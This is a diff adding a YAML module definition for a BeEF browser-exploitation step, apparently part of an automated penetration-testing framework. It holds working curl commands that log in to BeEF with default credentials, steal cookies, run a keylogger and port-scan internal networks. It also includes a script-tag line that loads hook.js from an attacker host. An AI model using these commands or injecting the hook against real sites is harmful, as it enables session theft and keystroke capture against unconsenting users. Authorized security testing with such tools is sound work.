@@ -1,0 +1,70 @@
+id: beef_browser
+name: BeEF Browser Exploitation
+category: exploitation
+phase: EXPLOIT
+priority: 85
+target_types:
+  - lab
+  - external
+description: >
+  Browser Exploitation Framework. Hooks browsers via XSS injection.
+  Once hooked: steal cookies, keylog, webcam, port scan internal networks,
+  social engineering, Metasploit integration. REST API for automation.
+  Turns XSS PoC (alert(1)) into real exploitation evidence.
+tags:
+  - browser
+  - xss
+  - beef
+  - client-side
+  - cookies
+  - keylogger
+mitre_techniques:
+  - T1189  # Drive-by Compromise
+  - T1185  # Browser Session Hijacking
+  - T1557  # Adversary-in-the-Middle
+  - T1056.004  # Credential API Hooking
+  - T1059.007  # JavaScript
+inputs:
+  - vulnerabilities.json
+  - services.json
+outputs:
+  - credentials.json
+  - evidence.json
+prerequisites:
+  - xss_vulnerability
+tools:
+  - curl
+  - beef-xss
+evidence_collection:
+  - Browser hook confirmation
+  - Stolen cookies/session tokens
+  - Keylogger output
+  - Internal network scan results
+commands:
+  authenticate: |
+    curl -s -X POST http://beef:3000/api/admin/login \
+      -H "Content-Type: application/json" \
+      -d '{"username":"beef","password":"beef123"}'
+  list_hooked_browsers: |
+    curl -s "http://beef:3000/api/hooks?token={TOKEN}"
+  list_modules: |
+    curl -s "http://beef:3000/api/modules?token={TOKEN}"
+  steal_cookies: |
+    curl -s -X POST "http://beef:3000/api/modules/{SESSION}/get_cookie/{MOD_ID}?token={TOKEN}"
+  keylogger: |
+    curl -s -X POST "http://beef:3000/api/modules/{SESSION}/event_logger/{MOD_ID}?token={TOKEN}"
+  internal_port_scan: |
+    curl -s -X POST "http://beef:3000/api/modules/{SESSION}/port_scanner/{MOD_ID}?token={TOKEN}" \
+      -H "Content-Type: application/json" \
+      -d '{"ipRange":"192.168.1.1-254","ports":"80,443,8080,22,3389,445"}'
+  hook_script: |
+    echo '<script src="http://{LHOST}:3000/hook.js"></script>'
+success_criteria:
+  - BeEF hook injected via confirmed XSS
+  - Browser hooked (appears in hooked browsers list)
+  - At least one module executed successfully
+  - Evidence collected (cookies, keys, or network scan)
+safety_notes:
+  - Only inject hooks on authorized targets
+  - XSS must be confirmed before hook injection
+  - Clean up hooks after engagement
